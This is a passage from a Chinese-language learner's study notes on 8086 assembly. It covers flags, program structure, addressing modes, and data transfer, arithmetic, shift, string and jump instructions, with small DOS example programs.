8位有符号数最大值 127ADD AL, 1     ; 结果应为128，但8位有符号数范围是-128~127 -&gt; 发生溢出 -&gt; OF = 1              ; 此时 AL 的实际值是 10000000B，即 -128\n\n\n\n5.奇偶标志 PF\n\n功能：检查运算结果最低8位中 ‘1’ 的个数是否为偶数。\n设置规则：\n如果结果低8位中 ‘1’ 的个数为偶数，则 PF = 1。\n如果为奇数，则 PF = 0。\n\n\n相关指令：JP (Jump if Parity Even), JNP (Jump if Parity Odd)\n应用场景：早期串行通信中用于简单的错误校验。\n示例：\n\nMOV AL, 00000101B ; 有 2 个 &#x27;1&#x27; (偶数) -&gt; PF = 1ADD AL, 1         ; AL = 00000110B -&gt; 有 2 个 &#x27;1&#x27; (偶数) -&gt; PF = 1ADD AL, 1         ; AL = 00000111B -&gt; 有 3 个 &#x27;1&#x27; (奇数) -&gt; PF = 0\n\n\n\n6.辅助进位标志 AF\n\n功能：记录运算结果低4位向高4位的进位或借位。\n设置规则：\n如果 bit3 向 bit4 有进位或借位，则 AF = 1；否则为 0。\n\n\n应用场景：主要用于 BCD 码 的调整指令（如 DAA, DAS），CPU 内部使用，程序员很少直接使用它进行条件判断。\n\n2.汇编程序1.汇编程序的执行过程下图描述了一个汇编程序从写出到最终执行的简要过程：\n\n\n\n\n第一步：编写汇编源程序\n使用文本编辑器（记事本、Notepad++等等），用汇编语言编写汇编源程序。这一步的工作是产生了一个存储\n一般是通过asm文件进行编写程序\n第二步：对源程序进行编译连接\n使用汇编语言编译程序对源程序文件中的源程序进行编译，产生目标文件；再用连接程序对目标文件进行连接，\n生成可在操作系统直接运行的可执行文件。\n可执行的文件包含两部分内容：\n\n程序和数据：程序中的汇编指令翻译过来的机器码和源程序中定义的数据\n相关的描述信息：程序多大，要占用多少内存空间等\n\n第三步：执行可执行文件中的程序\n在操作系统中，执行可执行文件中的程序。此时，操作系统依照可执行文件中的描述信息，将可执行文件中的\n机器码和数据加载入内存，并进行相关的初始化（比如CS:IP指向第一条要执行的指令），然后由CPU执行程序。\n2.源程序下面我们来看一下一段简单的程序：\nassume cs:codesg ;cs指向对应代码段codesg segment  ;代码段    mov ax,0123H    mov bx,0456H    add ax,bx    add ax,ax        mov ax,4C00H    int 21H   ;相当于return 0codesg endsend\n\n下面来对这个程序进行说明。在汇编语言程序中，包含两种指令，一种是汇编指令，一种是伪指令。汇编指令是有对应机器码的指令，可以被编译成机器指令，最终被CPU执行。而伪指令并没有对应的机器码，最终不会被CPU执行，而是会被编译器所执行。\n\n我们先来看一下上述程序中出现的伪指令。\n\n\nxxx segment …. xxx ends segment 和 ends 是成对使用的伪指令，这是在写可被编译器编译的汇编程序时必须要用到的一对伪指令。 segment和ends的功能是定义一个段，segment说明一个段的开始，ends说明一个段的结束。在汇编 源程序中，一个段必须要有一个名称标识，使用格式为： 段名 segment .. 段名 ends 像上述的程序中：（定义了一个代码段）\n codesg segment  ;定义了一个段，段的名称为codeseg，这个段从此开始  ;..codesg ends ;名称为codeseg的段到此结束\n\n 当然一个源程序可以由多个段组成，可以用来存放代码、数据或者当做栈空间来使用。一个汇编源程序至少要有一个段：代码段。\n\nend end是一个汇编程序的结束标记，编译器在编译汇编程序的时候，如果碰到end，就会结束对源程序的编译。所以，我们在写程序的时候，程序结束的时候应该在结尾处加上伪指令end。\n\nassume assume：假设，它可以用来假设某一段寄存器和程序中的某一个用segment…ends定义的段相关联。 在编程时，我们需要使用assume将有特定用途的段和相关的段寄存器关联起来。 例如上述程序中定义了一个名为codesg的代码段，我们需要将CS段寄存器和该段进行关联，格式则为： assume cs:codesg 如果你要关联多个段：可以使用如下格式 assume cs:codesg ds:datasg ss:stacksg\n\n\n\n除了伪指令以外，还有最重要的汇编指令。  编程的最终目的是让计算机完成一定的任务，而任务的完成由汇编指令来指示。汇编指令经过编译连接之后会转换成对应的机器码，如下图所示：\n\n除了上述内容以外，我们还需要知道codesg的具体含义  它被称为标号。一个标号指代了一个地址。上述示例中codesg在segment前面，作为一个段的名称，最终  在编译连接之后处理为一个段的段地址。\n\n\n认识上述的指令之后，我们再来看一下汇编程序的结构，从整体上来看一个汇编源程序应该需要什么。\n\n定义一个段（当然可以有多个段，但至少要有一个代码段）\n ;比如  定义了一个段，段名为abcabc segment;..abc ends\n\n往段中加入汇编指令\n abc segment    mov ax,2    ;这三条汇编语句的作用是求2^3    add ax,ax    add ax,axabc ends\n\n指明程序在何处结束\n abc segment    mov ax,2    ;这三条汇编语句的作用是求2^3    add ax,ax    add ax,axabc endsend\n\n指明代码段:人为设置代码段编译器并不会也这么认为\n assume cs:abcabc segment    mov ax,2    ;这三条汇编语句的作用是求2^3    add ax,ax    add ax,axabc endsend\n\n程序返回 上述讲解我们并没有讲述下面两条语句的作用，它们的作用是程序返回，类似于C语言中的return\n mov ax,4C00Hint 21H\n\n 当然我们不用过多探究它们具体是什么意思，我们知道它们的功能是程序返回就可以了。 所以上述程序还可以完善：(到此为止我们才算完成了一个较为完整的汇编源程序)\n assume cs:abcabc segment    mov ax,2    ;这三条汇编语句的作用是求2^3    add ax,ax    add ax,ax    mov ax,4c00H    int 21Habc endsend\n\n\n源程序和程序的区别：我们称源程序文件中的所有内容成为源程序，比如1.asm中的内容。将源程序中\n最终由计算机执行、处理的指令或数据称为程序。\n\n到此为止，我们已经接触了几个和结束相关的内容：段结束、程序结束、程序返回，下图展示了它们的区别：\n\n\n\n\n然后就是栈段的一个和其他语言不一样的地方就是，其他语言中入栈时下标增大，出栈时下标减小。但是在汇编中\n在 x86 架构中，栈是向低地址生长的（从高地址向低地址使用）。\n这意味着：\n\n栈底在高地址\n栈顶在低地址\nPUSH 时 SP 减小\nPOP 时 SP 增大\n\n于是我们在进行初始化的时候需要先将指针SP定义到高地址\nmov ax, stackmov ss, ax      ; SS指向栈段mov sp, 100     ; SP = 100（栈空间大小）\n\n\n\n; 定义数据段data segment    PROMPT      db &#x27;Please enter a digit (0-9): $&#x27;    VALID_MSG   db 0DH, 0AH, &#x27;You entered: $&#x27;    ERROR_MSG   db 0DH, 0AH, &#x27;Error: Not a digit! Please enter 0-9.$&#x27;    NEWLINE     db 0DH, 0AH, &#x27;$&#x27;    INPUT_CHAR  db ?data ends;? 表示不初始化内容; 0DH是回车，让光标到行首 0AH是换行，让光标到下一行  两者结合到一起才是常见的回车; 定义栈段stack segment stack    db 100 dup(?)stack ends;db：Define Byte，按字节分配  100：分配 100 个单元  dup(?)：重复分配; 定义代码段code segment    assume cs:code, ds:data, ss:stackstart:    ; 初始化数据段寄存器    mov ax, data    mov ds, ax    ;将data的地址赋值给DS寄存器    ; 初始化栈段寄存器    mov ax, stack    mov ss, ax    mov sp, 100        ; 设置栈指针        ; === 显示提示信息 ===    mov ah, 09h                   ; DOS功能：显示字符串    mov dx, offset PROMPT         ; DX指向提示字符串的地址    int 21h                       ; 调用DOS中断显示提示        ; === 获取用户输入 ===    mov ah, 01h                   ; DOS功能：带回显的字符输入    int 21h                       ; 调用DOS中断，输入的字符会保存在AL中    mov INPUT_CHAR, al            ; 将输入的字符保存到变量        ; === 检查输入是否为数字（0-9）===    cmp al, &#x27;0&#x27;                   ; 比较输入字符和&#x27;0&#x27;    jl  NOT_DIGIT                 ; 如果小于&#x27;0&#x27;，跳转到错误处理    cmp al, &#x27;9&#x27;                   ; 比较输入字符和&#x27;9&#x27;    jg  NOT_DIGIT                 ; 如果大于&#x27;9&#x27;，跳转到错误处理        ; === 输入是数字，显示结果 ===    mov ah, 09h                   ; DOS功能：显示字符串    mov dx, offset VALID_MSG      ; 显示&quot;你输入了：&quot;提示    int 21h        mov ah, 02h                   ; DOS功能：显示单个字符    mov dl, INPUT_CHAR            ; 将要显示的数字字符放入DL    int 21h                       ; 显示用户输入的数字        mov ah, 09h                   ; 显示换行    mov dx, offset NEWLINE    int 21h        jmp PROGRAM_END               ; 跳过错误处理部分，直接结束程序NOT_DIGIT:    ; === 输入不是数字，显示错误信息 ===    mov ah, 09h                   ; DOS功能：显示字符串    mov dx, offset ERROR_MSG      ; 显示错误信息    int 21h        mov ah, 09h                   ; 显示换行    mov dx, offset NEWLINE    int 21hPROGRAM_END:    ; === 程序结束，返回DOS ===    mov ah, 4ch                   ; DOS功能：程序退出    int 21h                       ; 调用DOS中断结束程序code endsend start\n\n\n\n\n\n\n\n3.寻址方式我看了一下汇编指令，发现基本上都是基于寻址进行使用的，于是我需要先学习寻址方式才能看明白汇编指令\n1.操作数寻址这部分关注指令的源操作数和目的操作数如何获取。\n1.立即寻址\n操作数（立即数）直接包含在指令编码中。\nMOV AX, 1234H  ; 将立即数 1234H 送入 AX 寄存器MOV BL, 42     ; 将十进制立即数 42 送入 BL 寄存器ADD CX, 100    ; CX 寄存器的值加上立即数 100\n\n\n\n2.寄存器寻址\n操作数存放在 CPU 的内部寄存器中。\nMOV AX, BX     ; 将 BX 的值复制到 AXINC SI         ; 使 SI 寄存器的值加 1ADD AL, BH     ; 将 AL 和 BH 的值相加，结果存入 AL\n\n\n\n3.直接寻址\n有效地址直接由指令中的一个位移量给出。\nMOV AX, [1234H]    ; 将 DS:1234H 地址处的字数据送入 AXMOV AL, [100H]     ; 将 DS:100H 地址处的字节数据送入 AL; 在 MASM 中，更常见的写法是使用符号（变量名）MOV AX, VAR_NAME   ; 等同于 MOV AX, [VAR_NAME]，将变量 VAR_NAME 的值送入 AXMOV AX, [VAR_NAME] ; 与上一句等价，显式地写出了括号\n\n直接通过地址传递，但是常见的写法还是使用变量，因为DS指向的就是数据段的地址\n4.寄存器间接寻址\n有效地址存放在一个 基址寄存器 或 变址寄存器 中。\n\n可用寄存器：BX, BP, SI, DI 。 BX和BP是基址寄存器，SI和DI是变址寄存器\n特点：寄存器如同一个指针。\n\nMOV AX, [BX]  ; AX = DS:[BX]MOV CL, [SI]  ; CL = DS:[SI]; 注意 BP 的默认段是 SS（堆栈段）MOV DX, [BP]  ; DX = SS:[BP]，常用于访问栈帧中的参数\n\n也就是将寄存器中的数据作为偏移地址，只不过BP使用的是栈段\n5.寄存器相对寻址\n有效地址 &#x3D; 基址&#x2F;变址寄存器 + 一个 8&#x2F;16 位的位移量。\n非常适合访问结构体或数组中的特定元素。\nMOV AX, [BX+10]      ; AX = DS:[BX + 10]MOV AX, 10[BX]       ; 与上一句完全等价，另一种写法MOV AX, ARRAY[SI]    ; 访问数组 ARRAY 的第 SI 个元素; 配合 BP 访问栈帧MOV AX, [BP+4]       ; AX = SS:[BP+4]，访问栈中第一个参数（假设 CALL 后 BP 指向旧BP）\n\n\n\n6.基址变址寻址\n有效地址 &#x3D; 一个基址寄存器 + 一个变址寄存器。\n\n合法组合：[BX+SI], [BX+DI], [BP+SI], [BP+DI]\n特点：非常适合访问二维数组。\n\nMOV AX, [BX+SI] ; AX = DS:[BX + SI]MOV AX, [BP+DI] ; AX = SS:[BP + DI]; 在 MASM 中也可以写成：MOV AX, [BX][SI] ; 与 [BX+SI] 等价\n\n\n\n7.相对基址变址寻址\n有效地址 &#x3D; 一个基址寄存器 + 一个变址寄存器 + 一个 8&#x2F;16 位的位移量。\n特点：最灵活的方式，可以访问结构体中的数组或数组中的结构体。\nMOV AX, [BX+SI+200]    ; AX = DS:[BX + SI + 200]MOV AX, 200[BX][SI]    ; 与上一句等价MOV AX, ARRAY[BX][DI]  ; 访问二维数组 ARRAY 的 [BX][DI] 元素; 访问结构体成员：假设 BX 指向一个结构体，该结构体在偏移 4 处有一个数组，SI 是数组索引。MOV AL, [BX+SI+4]\n\n\n\n总结\n\n\n\n寻址方式\n语法示例\n适用场景\n\n\n\n立即\nMOV AX, 5\n常数赋值、计算\n\n\n寄存器\nMOV AX, BX\n高速数据操作\n\n\n直接\nMOV AX, [100H]\n访问固定地址变量\n\n\n寄存器间接\nMOV AX, [BX]\n指针遍历\n\n\n寄存器相对\nMOV AX, [SI+10]\n数组、结构体\n\n\n基址变址\nMOV AX, [BX+SI]\n二维数组\n\n\n相对基址变址\nMOV AX, [BX+SI+IDX]\n复杂数据结构\n\n\n我们储存结构体和二维数组看起来不是线性储存，但是汇编会有其自己的方式进行储存，比如定义一个二维数组\n; 定义一个 3x4 的二维字数组，并初始化; 内存布局: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]Matrix2D DW 1, 2, 3, 4     ; 第 0 行: Matrix2D[0][0]=1, [0][1]=2, [0][2]=3, [0][3]=4         DW 5, 6, 7, 8     ; 第 1 行: Matrix2D[1][0]=5, [1][1]=6, ...         DW 9, 10, 11, 12  ; 第 2 行: Matrix2D[2][0]=9, [2][1]=10, ...\n\n\n\n\n\n4.汇编指令1.数据传输指令指令包括：MOV、XCHG、XLAT、LEA、LDS、LES、PUSH、POP、PUSHF、LAHF、SAHF、POPF、IN、OUT\n重点掌握：MOV、XCHG、XLAT、LEA、PUSH、POP\nMOV指令\n作用：把一个字或者直接的操作数从源地址传送到目的地址\n;使用格式：;mov target,sourcemov reg/mem,imm ;mem表示内存，imm表示立即数（数据）seg表示段寄存器mov reg/mem/seg,regmov reg/seg,memmov reg/mme.seg\n\n注意事项：\n\ntarget不能是CS（代码段寄存器）\ntarget和source不能同时为内存数、段寄存器（CS\\DS\\ES\\SS\\FS\\GS）\n不能将立即数传送给段寄存器\ntarget和source必须类型匹配，比如，要么都是字节，要么都是字或者都是双字等。\n由于立即数没有明确的类型，所以将立即数传送到target时，系统会自动将立即数零扩展到与\n\ntarget数的位数相同，再进行传送。有时，需要用BYTE PTR 、WORD PTR明确指出立即数的位数\n图示解析：\n\n\n段寄存器不能直接被立即数赋值，需要先将数据存入通用寄存器或者从内存中读取\n示例：\nmov al,4        ;将4以字节的形式传送给al寄存器，为字节传送mov cx,00FFH    ;将00FFH传送给CX寄存器  上述的4和00FF都为立即数，cx，al均为regmov si,0200H    ;将0200H传送给寄存器SI，为字传送mov ax,bx       ;将bx中的内容传递给ax，属于寄存器之间的操作mov byte ptr [si],0ah ;byte ptr说明是字节操作mov ds,ax       ;将ax中内容传递个段寄存器ds，属于段寄存器（seg）和寄存器之间的传送mov [si],al     ;将al中的内容传送给ds:[si]指向的内存单元中;[bp] ---&gt; ss:[bp]   [si] ---&gt; ds:[si]  [bx] ---&gt; ds:[bx]\n\n\n\nXCHG指令\n作用：将一个字节或者自己的源操作数和目的操作数相交换\n;使用格式;XCHG OPRD1,OPRD2;      目的   源XCHG reg,regXHCG reg,memXCHG mem,reg;XCHG指令可以交换两个寄存器、寄存器-&gt;寄存器中的数据\n\n示例：\nxchg al,clxchg ax,[bx]xchg [bx],ax\n\n注意事项：\n\n不能同时都为内存操作\n任何一个寄存器都不能为段寄存器\n任何一个操作不能为立即数\n两个操作数的长度必须相等\n\n换码指令XLAT\n作用：将bx指定的缓冲区、AL指定的位移处的一个字节数据取出赋值给AL\n;使用格式xlat    ;al&lt;-ds:[bx+al]   [bx+al]:整体作为偏移地址，al作为地址位移\n\n示例：\nmov bx,0100Hmov al,03Hxlat            ;al&lt;-ds:[0100+03]H\n\n\n\n堆栈指令PUSH、POP\n作用：将寄存器或者储存器中的数据按照堆栈操作的规则进行出入栈\n;使用格式;PUSH 源操作数;POP 目的操作数PUSH reg\\mem\\segPOP  reg\\mem\\seg\n\n示例：\nPUSH ax   ;将ax寄存器中的数据压入到栈中POP ax    ;将栈顶中的数据出栈到ax中\n\n注意事项：\n\n当栈为空时能不进行出栈\n指令的操作数必须是16位，即不能使用al这种8位寄存器\n\n地址传送指令LEA LDS LES\n作用：将对应的地址表示送入对应的寄存器中\n;使用格式LEA reg,memLDS reg,memLES reg,mem\n\n示例：\nmov bx,0400Hmov si,3CHlea bx,[bx+si+0f62h];bx = 0400H+003CH+0f62H = 139EH\n\n虽然LEA的能力很强大，可以用来计算有效地址，但是我对地址的理解还停留在偏移地址\nLDS和LES是用来加载远地址的，也就是不在当前段的地址，不用我就懒得去看了\nLDS：将mem指定的字送入指定的寄存器中，并且DS&#x3D;mem+2\nLES：将mem指定的字送入指定的寄存器中，并且ES&#x3D;mem+2\n2.算数运算指令指令包括：ADD、ADC、INC、SUB、SBB、DEC、CMP、NEG、MUL、IMUL、DIV、IDIV、\nDAA、DAS、AAA、 AAS、AAM、AAD、CBW、CWD\n重点掌握：ADD、ADC、INC、SUB、SBB、DEC、CMP\n加法指令ADD、ADC、INC\n;使用格式ADD reg,imm/reg/memADD mem,imm/reg;reg&lt;-reg+reg/mem/imm  mem&lt;-mem+reg/imm--------------------------------ADC reg,imm/reg/memADC mem,imm/reg;reg&lt;-reg+imm/reg/mem+CF mem&lt;-mem+imm/reg+CF;ADC指令将源与目的操作数相加，再加上CF标志，结果送到目的操作数，ADC指令主要与ADD配合--------------------------------INC reg/mem;reg/mem&lt;-reg/mem+1\n\n示例：\nmov ax,0123add ax,ax   ;ax&lt;-ax+ax---------------------------------------------------mov ax,4652h    ;ax=4652hadd ax,0f0f0h   ;ax=3742h，CF=1 最高位发生进位了 进位标志符CF=1mov dx,0234h    ;dx=0234hadc dx,0f0f0h   ;dx=f325h，这个CF来自上一次操作，adc在进行相加的时候除了加上两个参数还会再加上上一条指令的CF的值，然后再根据执行结果刷新CF值---------------------------------------------------inc bx       ;bx&lt;-bx+1  自增1\n\nINC指令不影响进位CF标志，按定义设置其他状态标志\n减法指令 SUB、SBB、DEC\n;使用格式SUB reg,imm/reg/memSUB mem,imm/reg;reg&lt;- reg-imm/reg/mem  mem&lt;- mem-imm/reg----------------------------------------------------SBB reg,imm/reg/memSBB mem,imm/reg;reg&lt;-(reg-(imm/reg/mem)-CF)  mem&lt;-mem-imm/reg-CF----------------------------------------------------DEC reg/mem;reg/mem&lt;-reg/mem-1\n\nDEC指令不影响进位CF标志，按定义设置其他状态标志\n这个和加法指令是对应的，只不过所有加都变成了减\n比较指令 CMP\nCMP指令将目的操作数减去源操作数，按照定义相应设置状态标志\n;使用格式CMP reg,imm/reg/memCMP mem,imm/reg;reg-imm/reg/mem   mem-imm/re\n\n示例：\ncmp al,100  ;al-100    jz below  ;jz就是判断ZF标志符 如果ZF为1则触发below    ;al==100，跳转到below执行    sub al,100    ;al!=100，   al&lt;-al-100    inc ah  ;ah&lt;-ah+1below:  ...\n\nCMP 指令会影响以下关键标志位：\n\n\n\n标志位\n全称\n设置条件\n\n\n\nZF\n零标志\n如果两个操作数相等（结果为零），则 ZF &#x3D; 1\n\n\nCF\n进位标志\n如果无符号数比较中 destination &lt; source，则 CF &#x3D; 1\n\n\nSF\n符号标志\n如果有符号数比较结果为负，则 SF &#x3D; 1\n\n\nOF\n溢出标志\n如果有符号数比较发生溢出，则 OF &#x3D; 1\n\n\n乘除法指令\n乘法指令：MUL、IMUL。MUL无符号乘法（字&#x2F;字节），IMUL有符号乘法（字&#x2F;字节）；被乘数被隐藏在al&#x2F;ax中，结果溢出的数据被保存在ah&#x2F;dx中\n除法指令：DIV、IDIV。DIV无符号除法（字&#x2F;字节），IDIV有符号除法（字&#x2F;字节）；\n除数放在8&#x2F;16位reg或内内存单元中，被除数默认在AX&#x2F;（DX-AX）中（16位），\n结果：AL放商，AX放余数&#x2F;AX放商，DX放余数\n这个在汇编中好像有点难，而且考试也考的不是特别多，以后再说吧\n其余指令\n求反指令：NEG。以0减去操作数；\n符号扩展指令：CBW、CWD。CBW字节装换为字，CWD、字转为双字节；将al&#x2F;ax的数据扩展为字数据（前者扩展到ah中，后者扩展到dx中）\n十进制调整指令：DAA、DAS、AAA、AAS、AAM、AAD。\nDAA&#x2F;DAS将加&#x2F;减之后的结果调整为压缩BCD码AAA&#x2F;AAS将加&#x2F;减之后的结果调整为非压缩BCD码AAM&#x2F;AAD将乘&#x2F;除之后的结果调整为非压缩BCD码；\n3.位运算指令指令包括：AND、OR、XOR、NOT、TEST、SHL、SAL、SHR、SAR、RCL、RCR、ROL、ROR\n逻辑运算 AND、OR、XOR、NOT、TEST\n将操作数进行按位的运算，逻辑运算指令对操作的要求大多和MOV指令相同。非 运算指令要求操作数不能是立即数！\n;使用格式AND target,source   ;按位与   1 and 1 == 1 1 and 0 == 0 0 and 0 == 0OR target,source    ;按位或   1 or 1 == 1  1 or 0 == 1  0 or 0 == 0XOR target,source   ;按位异或  1 xor 1 == 0 0 xor 1 == 1 0 xor 0 == 0 相等为0，相异为1;将source与target进行相应操作之后的结果保存到target中TEST target,source;将source与target进行按位与操作，根据结果设置标志位但是不保存结果NOT target          ;按位非   1 --&gt; 0 0--&gt; 1 取反就是二进制0和1进行互换;将target中取反后的结果放入到target中\n\n这个终于算是见过的一个东西了，基本上所有的语言这个都一样\n示例：\nand bl,[bX]  ;bl&lt;-bl and ds:[bx]  or ax,bx     ;ax&lt;-ax or bx        xor ax,bx    ;ax&lt;-ax xor bx         test ax,8000H;ax and 8000Hnot ax       ;ax&lt;-not ax\n\n注意事项：\n\n通常使用AND指令对指定位清0\n通常使用OR指令对指定位置1\n通常使用NOT指令将某个数据取反码，再加1就得到补码\n通常使用XOR指令来取反某位\n通常使用TEST指令来测试指定位置是0还是1\n非 运算对标志位不影响，其余指令对标志均会产生影响\n\n4.移位运算指令非循环移位 SHL、SAL、SHR、SAR\n;左移:算术左移和逻辑左移;使用格式SAL reg/mem,1   ;SAL reg/mem,cl  ;有符号数、算术左移，如果采用立即数，立即数必须是1，下述同理SHL reg/mem,1SHL reg/mem,cl  ;无符号数、逻辑左移;将数据按照指定的位数往左按位移动，如下图\n\n\n\n示例：\nmov bl,f8sal bl,1;结果 CF=1，bl = F0;1111 1000 -&gt; 1111 0000 后面的参数是左移位数，后面用0填充，然后把移出去的数放到CF中\n\n然后我们需要注意，在左移的时候SHL和SAL是相同的指令\n然后就是右移\n;右移:算术右移和逻辑右移;使用格式SAR reg/mem,1   SAR reg/mem,cl  ;有符号数、算术右移 为了不影响符号右移时不是补0而是复制符号位SHR reg/mem,1SHR reg/mem,cl  ;无符号数、逻辑右移;将数据按照指定的位数往左按位移动，如下图\n\n\n\n逻辑右移：移动一位后，若次高位与最高位不相等，则OF&#x3D;1，否则OF&#x3D;0\n示例：\nmov bl,f8sar bl,1;CF = 0,结果为：bl = fC\n\n\n\n循环移位 RCL、RCR、ROL、ROR\n;带进位的循环移位;循环左移RCL reg/mem,1RCL reg/mem,cl;循环右移RCR reg/mem,1RCR reg/mem,cl;带进位循环移位，如下图\n\n\n\n示例：\nmov al,f8rcl al,1;CF = 1,al = f0;1111 1000 -&gt; 1111 0000 注意这个不是补0，而是将原来CF的值补上去rcl al,1;CF = 1,al = E1;1111 0000 -&gt; 1110 0001\n\n\n\n然后就是不带进位的循环移位\n;不带进位的循环移位;循环左移ROL reg/mem,1ROL reg/mem,cl;循环右移ROR reg/mem,1ROR reg/mem,cl;不带进位循环移位，如下图\n\n\n\n示例：\nmov al,f8rol al,1;CF = 1,al = f1 这个就是直接循环，不需要经过CF 但是最高位还是给CF;1111 1000 -&gt; 1111 0001 CF=1\n\n\n\n5.串操作指令指令包括：MOVS、LODS、STOS、CMPS、SCAS、REP\n串的概念：串是连续存放在内存中的字节块或字块。每个串有一个起始地址和长度，待操作的数据串\n称为源串，目的地址称为目标串。\n串指令操作的特点：\n\n源操作数用寄存器SI寻址，默认在数据段DS中，但允许段超越：DS:[SI]\n目的操作数用寄存器DI寻址，默认在附加段ES中，不允许段超越：ES:[DI]\n每执行一次串操作指令，SI和DI将自动修改：±1（对于字节串）或±2（对于字串）  执行指令CLD指令后，DF &#x3D; 0，地址指针增1或2  执行指令STD指令后，DF &#x3D; 1，地址指针减1或2\n数据快长度值由CX指定\n\n串传送指令 MOVS\n作用：把字节&#x2F;子操作数从主存的源地址传送至目的地址\n;使用格式，指令包括 MOVSB、MOVSWMOVSB   ;字节串传送， ES:[DI]&lt;-DS:[si]        ;DF==0, SI&lt;-SI+1,DI&lt;-DI+1,DF==1,则递减 注意MOVSB操作的是字节MOVSW   ;字串传送：ES:[DI]&lt;-DS:[SI]        ;DF==0, SI&lt;-SI+2,DI&lt;-DI+2,DF==1,则递减 MOVSW操作的是字\n\n串传送指令也不是直接传送字符串，因为汇编程序不会对字符串会进行检查，每次只能传送字或则字节，只不过汇编提供了段和指针用于我们使用循环进行字符串传递\n然后就是MOVS指令是从指定的寄存器中去寻址，不需要参数\n示例：\nmov si,offset source        ;获得源偏移地址 写入SI寄存器        mov di,offset destination   ;获得目的偏移地址        mov cx,0064H ;cx&lt;-传送次数        cld         ;置DF=0，地址增加 DF为0时对串的操作的两个指针增1，为1则减1again:  movsb       ;传送一个字节        dec cx      ;传送次数减1        jnz again   ;判断传送次数cx是否为0 不为0，则到again位置执行指令 否则，结束\n\n\n\n\n\n串存储指令 STOS\n作用：把AL或AX的数据传送至目的地址\n;使用格式，指令包括 STOSB、STOSWSTOSB   ;字节串存储：ES:[DI]&lt;-AL        ;DI&lt;-DI±1STOSW   ;字串存储：ES:[DI]&lt;-AX        ;DI&lt;-DI±2\n\n示例：\nmov ax,0        mov di,0        mov cx,8000h    ;cx&lt;-传送次数（32×1024）        cld             ;DF=0，地址增加again:  stosw           ;传送一个字        dec cx          ;传送次数减1        jnz again       ;传送次数cx是否为0\n\n\n\n串读取指令 LODS\n作用：将字节&#x2F;字从数据段中读取出来保存在AL或者AX中\n;使用格式，指令包括 LODSB、LODSWLODSB   ;字节串存储：AL&lt;-DS:[SI]        ;SI&lt;-SI±1LODSW   ;字串存储：AX&lt;-DS:[SI]        ;SI&lt;-SI±2\n\n\n\n串比较指令 CMPS\n作用：将主存中的源操作数减去目的操作数，以便设置标志，进而比较两操作数之间的关系\n;使用格式，指令包括 CMPSB、CMPSWCMPSB   ;字节串比较：DS:[SI]-ES:[DI]        ;SI&lt;-SI±1，DI&lt;-DI±1CMPSW   ;字串比较：DS:[SI]-ES:[DI]        ;SI&lt;-SI±2，DI&lt;-DI±2\n\n\n\n串扫描指令 SCAS\n这个就是比较AX和目的操作数\n;使用格式，指令包括 SCASB、SCASWSCASB   ;字节串比较：AL-ES:[DI]        ;DI&lt;-DI±1SCASW   ;字串比较：AX-ES:[DI]        ;DI&lt;-DI±2\n\n示例：\nmov di,offset string        mov al,20h  ;空格对应的ASCII码值为20h        mov cx,count        cldagain:  scasb       ;搜索 比较al也就是空格和目标字符串 如果相等则ZF=1        jz found    ;为0（ZF=1），发现空格        dec cx      ;不是空格        jnz again   ;搜索下一个字符  found:  ...         ;不含空格，则继续执行\n\n\n\n重复前缀指令 REP\n重复前缀 REP 可以加到串传送操作指令时。REP 前缀是的每次执行串指令后CX-1。CX-1后，重复执行串指令，直到CX值为0时，指令才终止。\n;使用示例 REP、REPZ、REPNZ、REPE、REPNErep movsx   ;无条件重复直到cx==0repz cmpsx  ;无条件重复直到CX==0 / ZF == 0repnz cmpsx ;无条件重复直到CX==0 / ZF == 1repe cmpsx  ;不断比较，直到CX==0 / ZF == 0repne cmpsx ;不断比较，直到CX==0 / ZF == 1;需要注意的是REPE 和 REPZ 是同一个指令的两种写法，REPNE 和 REPNZ 也是。 难怪我看着怎么没区别\n\n示例：\nmov si,offset sourcemov di,offset destinationmov cx,100  ;cx&lt;-传送次数cldrep movsb;----------------------------------------    mov si,offset string1    mov di,offset string2    mov cx,count ;设置重复次数    cld    repz cmpsb      ;重复比较两个字符    jnz unmat       ;字符串不等，转移    mov al,0        ;字符串相等，设置00h    jmp output      ;转向outputunmat:  mov al,0ffh     ;设置ffhoutput: mov result,al   ;输出结果标记\n\n\n\n\n\n\n\n\n\n6.控制转移指令指令包括：JMP、JCC、JCXZ、LOOP、LOOPZ、LOOPNZ、LOOPNE、CALL、RET、INT\n终于到我们的判断语句了，把这个学完估计就可以看懂简单的汇编程序了\n无条件转移指令 JMP\n作用：跳转到对应的指令地址\n;使用格式 target：跳转目标，可以是标签、地址或寄存器jmp label       ;IP&lt;-IP+位移量jmp reg/mem     ;IP&lt;-reg/mem  reg以及mem都需要是16位jmp far ptr label ;CS=label的段地址，IP=label的偏移地址jmp far ptr mem   ;CS=[mem+2],IP=[mem]\n\n示例：\nlabel:    ...    jmp label;此时往上跳转，则位移量为负数mov ax,4jmp ax      ;ip&lt;-4;------------------------------------mov word ptr [bx],0 ;使用ptr可以明确传递一个字mov word ptr [bx+2],1500jmp far ptr [bx]        ;CS = 1500, IP = 0;这里涉及到了汇编中的一些规则 就是在进行跳转的时候会将地址前两位也就是低字节作为IP 后两位高字节作为CS\n\n当指令只需要在当前代码段范围内转移时（+-32KB），不需要更改CS地址，只需要修改IP地址\n实际编程时，汇编程序会根据目标地址的距离，自动处理成短转移&#x2F;近转移&#x2F;远转移\n程序员可用操作符short&#x2F;near ptr&#x2F;far ptr 强制\n但是这个操作在我考试的时候好像用不到\n条件转移指令 JCC\n作用：根据运算结果跳转到对应的指令地址（下图为jcc指令集以及判断条件含义）\n我们先来看各个字母的含义\n\n\n经过组合就是判断指令了\n\n\n这个我是懒得去记了，起始就是每一个字母对应一个标志寄存器，考试的时候推不出来算了\n示例：\nmov di,offset string        mov al,20h  ;空格对应的ASCII码值为20h        mov cx,count        cldagain:  scasb       ;搜索        jz found    ;为0（ZF=1），发现空格 ZF用于判断是否相等，相等则CF=1        dec cx      ;不是空格        jnz again   ;搜索下一个字符        found:  ...         ;不含空格，则继续执行;我感觉这个代码有问题，即使没有找到空格最后不也是要经过一遍found吗\n\n\n\n计数器CX为0跳转指令 JCXZ\nCX寄存器通常在程序中用作计数器，JCXZ指令用来判断计数是否为0\n;使用格式jcxz label  ;CX=0，发生转移：IP&lt;-IP+8位位移量            ;CX≠0，顺序执行\n\n\n\n循环指令 LOOP、LOOPZ、LOOPNZ、LOOPNE\nLOOP label      ;CX←CX－1，                ;CX≠0，循环到标号labelLOOPZ label     ;CX←CX－1，                ;CX≠0且ZF＝1，循环到标号labelLOOPNZ label    ;CX←CX－1，                